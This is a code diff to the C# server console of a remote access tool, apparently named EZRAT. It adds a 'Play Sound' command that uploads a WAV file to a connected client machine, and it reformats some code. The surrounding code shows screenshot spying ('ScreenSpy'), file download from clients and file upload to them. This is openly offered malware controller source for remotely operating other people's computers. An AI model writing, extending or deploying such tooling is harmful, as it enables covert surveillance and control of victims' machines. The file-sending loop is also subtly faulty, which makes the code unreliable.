@@ -353,6 +353,15 @@ namespace EZRATServer
                 case "ScreenSpy":
                     SendCommand("screenspy;", GetIdClient());
                     break;
+                case "Play Sound":
+                    OpenFileDialog opf = new OpenFileDialog();
+                    opf.Multiselect = false;
+                    opf.Filter = "*.wav| Wav files";
+                    if (opf.ShowDialog() == DialogResult.OK)
+                    {
+                        UploadFile(opf.FileName);
+                    }
+                    break;
                 default:
                     break;
             }
@@ -667,7 +676,7 @@ namespace EZRATServer
                             fs.Write(data, 0, nb);
                             fs.Flush();
                             tot += (uint)nb;
-                            if(nb == -1)
+                            if (nb == -1)
                             {
                                 loop_break = false;
                             }
@@ -675,7 +684,7 @@ namespace EZRATServer
                     }
                     catch (IOException ex)
                     {
-                        MessageBox.Show("File download",$"File : {fileNameDownload} is downloaded",MessageBoxButtons.OK,MessageBoxIcon.Information);
+                        MessageBox.Show("File download", $"File : {fileNameDownload} is downloaded", MessageBoxButtons.OK, MessageBoxIcon.Information);
                         fs.Close();
                         ns.Close();
                     }
@@ -778,20 +787,59 @@ namespace EZRATServer
                         text = text.Substring(10);
                         byte[] img = Encoding.Default.GetBytes(text);
                         ShowScreenShot(StreamToImage(img));
-                    }else if(text.StartsWith("upfilestop;"))
+                    }
+                    else if (text.StartsWith("upfilestop;"))
                     {
-                        MessageBox.Show("Upload file","File uploaded finish",MessageBoxButtons.OK,MessageBoxIcon.Information);
+                        MessageBox.Show("Upload file", "File uploaded finish", MessageBoxButtons.OK, MessageBoxIcon.Information);
                     }
 
 
                 }
 
-                ENDFUNC:
+            ENDFUNC:
 
                 if (!dclient) current.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, current); //If client is not disconnecting, restart the reading
             }
         }
 
+
+        private void UploadFile(string path)
+        {
+            try
+            {
+                //this._parent.SendFile(path,this.Path); //Send the data to the server
+                string fileName = System.IO.Path.GetFileName(path);
+
+                //File.ReadAllBytes(path).ToList().ForEach((b) => { dataFile += b.ToString() + Constantes.Separator; });
+                //string result = _parent.Encrypt("upfile;" + dataFile);                    //string result = _parent.Encrypt("upfile;" + dataFile);
+                this.SendCommand("upfile;", this.GetIdClient()); // + this.Path + new NameUpload(opf.FileName).Dialog()  + ";" + dataFile, this.BaseWindows.GetIdClient());
+                SendFile(path);
+
+            }
+            catch (Exception ex) //Failed to send data to the server
+            {
+                Console.WriteLine("Send File Failure " + ex.Message);
+                return; //Return
+            }
+        }
+
+        private void SendFile(string path)
+        {
+            string file_name = System.IO.Path.GetFileName(path);
+            int size = 1024;
+            uint tot = 0;
+            FileStream fs = new FileStream(path, FileMode.Open);
+            NetworkStream ns = new NetworkStream(this.ClientSockets[this.GetIdClient()]);
+            byte[] data = new byte[size];
+            while (tot < fs.Length)
+            {
+                fs.Read(data, 0, size);
+                tot += (uint)data.Length;
+                ns.Write(data, 0, size);
+            }
+            Console.WriteLine($"Total data : {tot}");
+            fs.Close();
+        }
 
         public void ShowScreenShot(Image img)
         {
